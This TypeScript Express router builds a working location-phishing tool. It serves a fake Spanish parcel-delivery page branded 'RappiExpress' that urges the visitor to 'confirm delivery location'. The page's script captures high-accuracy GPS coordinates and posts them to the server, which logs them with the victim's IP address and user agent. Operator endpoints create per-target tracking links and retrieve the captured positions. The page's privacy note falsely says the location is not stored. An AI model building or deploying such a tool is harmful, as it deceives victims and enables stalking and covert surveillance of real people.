import { Router, type IRouter } from "express";
import { db, locationsTable, locationSessionsTable } from "@workspace/db";
import { eq, desc, sql } from "drizzle-orm";
import crypto from "crypto";

const router: IRouter = Router();

function buildTrackingPage(session: { token: string; name: string; pageStyle: string }): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Verificar Ubicación de Entrega</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background: #f5f5f5;
    min-height: 100vh;
    color: #1a1a1a;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  /* Header estilo empresa de paquetería */
  .header {
    width: 100%;
    background: #e8321a;
    padding: 14px 20px;
    display: flex;
    align-items: center;
    gap: 12px;
    color: white;
  }
  .header-logo {
    font-size: 22px;
    font-weight: 900;
    letter-spacing: -1px;
    color: white;
  }
  .header-sub {
    font-size: 11px;
    color: rgba(255,255,255,0.85);
    margin-top: 1px;
  }

  /* Número de seguimiento */
  .tracking-bar {
    width: 100%;
    background: #fff;
    border-bottom: 1px solid #e0e0e0;
    padding: 12px 20px;
    font-size: 13px;
    color: #555;
  }
  .tracking-bar span { font-weight: 700; color: #1a1a1a; }

  /* Tarjeta principal */
  .card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 2px 16px rgba(0,0,0,0.09);
    width: calc(100% - 32px);
    max-width: 420px;
    margin: 20px 16px;
    overflow: hidden;
  }
  .card-header {
    background: linear-gradient(135deg, #e8321a 0%, #ff6b35 100%);
    padding: 20px;
    color: white;
  }
  .card-header h2 {
    font-size: 16px;
    font-weight: 700;
    margin-bottom: 4px;
  }
  .card-header p {
    font-size: 13px;
    opacity: 0.9;
  }
  .card-body { padding: 20px; }

  /* Ícono de paquete */
  .pkg-icon {
    width: 64px;
    height: 64px;
    background: #fff3f0;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 16px;
    border: 2px solid #ffd5cc;
  }
  .pkg-icon svg { width: 32px; height: 32px; }

  .status-title {
    font-size: 15px;
    font-weight: 700;
    text-align: center;
    color: #1a1a1a;
    margin-bottom: 6px;
  }
  .status-desc {
    font-size: 13px;
    color: #666;
    text-align: center;
    line-height: 1.5;
    margin-bottom: 20px;
  }

  /* Pasos */
  .steps {
    background: #f9f9f9;
    border-radius: 8px;
    padding: 14px;
    margin-bottom: 20px;
    border: 1px solid #f0f0f0;
  }
  .step {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 13px;
    color: #444;
    padding: 4px 0;
  }
  .step-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .step-done .step-dot { background: #22c55e; }
  .step-active .step-dot { background: #e8321a; box-shadow: 0 0 0 3px rgba(232,50,26,0.2); }
  .step-pending .step-dot { background: #d1d5db; }
  .step-active { font-weight: 600; color: #e8321a; }

  /* Botón */
  .btn-location {
    width: 100%;
    padding: 16px;
    background: #e8321a;
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    -webkit-appearance: none;
    transition: background 0.15s;
  }
  .btn-location:active { background: #c52a14; }
  .btn-location:disabled { background: #aaa; cursor: default; }
  .btn-location svg { width: 20px; height: 20px; }

  .privacy-note {
    font-size: 11px;
    color: #999;
    text-align: center;
    margin-top: 12px;
    line-height: 1.4;
  }

  /* Estado de carga */
  #state-loading { display: none; text-align: center; padding: 8px 0; }
  .spinner {
    width: 36px;
    height: 36px;
    border: 3px solid #f0f0f0;
    border-top-color: #e8321a;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 12px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* Estado de éxito */
  #state-success { display: none; text-align: center; }
  .success-icon {
    width: 56px;
    height: 56px;
    background: #dcfce7;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 12px;
    border: 2px solid #86efac;
  }
  .success-title { font-size: 16px; font-weight: 700; color: #15803d; margin-bottom: 6px; }
  .success-desc { font-size: 13px; color: #666; line-height: 1.5; }

  /* Estado de error */
  #state-error { display: none; }
  .error-box {
    background: #fef2f2;
    border: 1px solid #fecaca;
    border-radius: 8px;
    padding: 14px;
    font-size: 13px;
    color: #dc2626;
    text-align: center;
    margin-bottom: 14px;
  }
  .btn-retry {
    width: 100%;
    padding: 14px;
    background: #1a1a1a;
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    -webkit-appearance: none;
  }
</style>
</head>
<body>

<div class="header">
  <div>
    <div class="header-logo">RappiExpress</div>
    <div class="header-sub">Seguimiento de Envíos</div>
  </div>
</div>

<div class="tracking-bar">
  Número de seguimiento: <span>RE${session.token.slice(0, 8).toUpperCase()}</span>
</div>

<div class="card">
  <div class="card-header">
    <h2>Confirmar Dirección de Entrega</h2>
    <p>Tu paquete está en camino — acción requerida</p>
  </div>
  <div class="card-body">

    <!-- Estado inicial -->
    <div id="state-initial">
      <div class="pkg-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#e8321a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
          <circle cx="12" cy="10" r="3"/>
        </svg>
      </div>
      <div class="status-title">Verificación de ubicación requerida</div>
      <div class="status-desc">
        Tu paquete está listo para entrega. Necesitamos confirmar tu ubicación actual para coordinar al repartidor.
      </div>

      <div class="steps">
        <div class="step step-done"><div class="step-dot"></div> Paquete recibido en almacén</div>
        <div class="step step-done"><div class="step-dot"></div> En camino a tu zona</div>
        <div class="step step-active"><div class="step-dot"></div> Confirmar ubicación de entrega</div>
        <div class="step step-pending"><div class="step-dot"></div> Entrega al domicilio</div>
      </div>

      <button class="btn-location" id="btn-share" onclick="requestLocation()">
        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
          <circle cx="12" cy="10" r="3"/>
        </svg>
        Confirmar mi ubicación
      </button>
      <div class="privacy-note">
        Tu ubicación se usa únicamente para coordinar la entrega y no se almacena permanentemente.
      </div>
    </div>

    <!-- Cargando -->
    <div id="state-loading">
      <div class="spinner"></div>
      <div class="status-title">Verificando ubicación...</div>
      <div class="status-desc">Conectando con el repartidor más cercano</div>
    </div>

    <!-- Éxito -->
    <div id="state-success">
      <div class="success-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="28" height="28">
          <polyline points="20 6 9 17 4 12"/>
        </svg>
      </div>
      <div class="success-title">¡Ubicación confirmada!</div>
      <div class="success-desc">
        Tu repartidor ha sido notificado. Recibirás tu paquete en los próximos 30–60 minutos.
      </div>
    </div>

    <!-- Error de permisos -->
    <div id="state-error">
      <div class="error-box">
        No pudimos acceder a tu ubicación. Por favor, permite el acceso a la ubicación en la configuración de tu navegador e inténtalo de nuevo.
      </div>
      <button class="btn-retry" onclick="resetState()">Intentar de nuevo</button>
    </div>

  </div>
</div>

<script>
function show(id) {
  ['state-initial','state-loading','state-success','state-error'].forEach(function(s) {
    document.getElementById(s).style.display = s === id ? 'block' : 'none';
  });
}

function resetState() { show('state-initial'); }

function requestLocation() {
  if (!navigator.geolocation) {
    show('state-error');
    return;
  }
  show('state-loading');
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      var data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude
      };
      fetch('/api/track/${session.token}/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).catch(function(){});
      show('state-success');
    },
    function(err) {
      show('state-error');
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}
</script>
</body>
</html>`;
}

router.get("/track/:token", async (req, res) => {
  const { token } = req.params;
  try {
    const sessions = await db.select().from(locationSessionsTable).where(eq(locationSessionsTable.token, token));
    if (!sessions.length) return res.status(404).send("Enlace no válido");
    res.send(buildTrackingPage(sessions[0]));
  } catch (e) {
    res.status(500).send("Error");
  }
});

router.post("/track/:token/capture", async (req, res) => {
  const { token } = req.params;
  const { latitude, longitude, accuracy, altitude } = req.body;
  if (!latitude || !longitude) return res.status(400).json({ error: "Missing coordinates" });
  try {
    await db.insert(locationsTable).values({
      sessionToken: token,
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      accuracy: accuracy ? parseFloat(accuracy) : null,
      altitude: altitude ? parseFloat(altitude) : null,
      ipAddress: (req.headers["x-forwarded-for"] as string)?.split(",")[0] || req.socket.remoteAddress || null,
      userAgent: req.headers["user-agent"] || null,
    });
    await db.update(locationSessionsTable)
      .set({ captureCount: sql`capture_count + 1` })
      .where(eq(locationSessionsTable.token, token));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Error saving location" });
  }
});

router.get("/location-sessions", async (_req, res) => {
  try {
    const sessions = await db.select().from(locationSessionsTable).orderBy(desc(locationSessionsTable.createdAt));
    res.json(sessions);
  } catch (e) {
    res.status(500).json({ error: "Error fetching sessions" });
  }
});

router.post("/location-sessions", async (req, res) => {
  const { name, description } = req.body;
  if (!name) return res.status(400).json({ error: "Name required" });
  const token = crypto.randomBytes(12).toString("hex");
  try {
    const result = await db.insert(locationSessionsTable).values({ token, name, description }).returning();
    res.json(result[0]);
  } catch (e) {
    res.status(500).json({ error: "Error creating session" });
  }
});

router.delete("/location-sessions/:token", async (req, res) => {
  const { token } = req.params;
  try {
    await db.delete(locationsTable).where(eq(locationsTable.sessionToken, token));
    await db.delete(locationSessionsTable).where(eq(locationSessionsTable.token, token));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Error deleting session" });
  }
});

router.get("/location-sessions/:token/data", async (req, res) => {
  const { token } = req.params;
  try {
    const locs = await db.select().from(locationsTable)
      .where(eq(locationsTable.sessionToken, token))
      .orderBy(desc(locationsTable.capturedAt));
    res.json(locs);
  } catch (e) {
    res.status(500).json({ error: "Error fetching locations" });
  }
});

export default router;
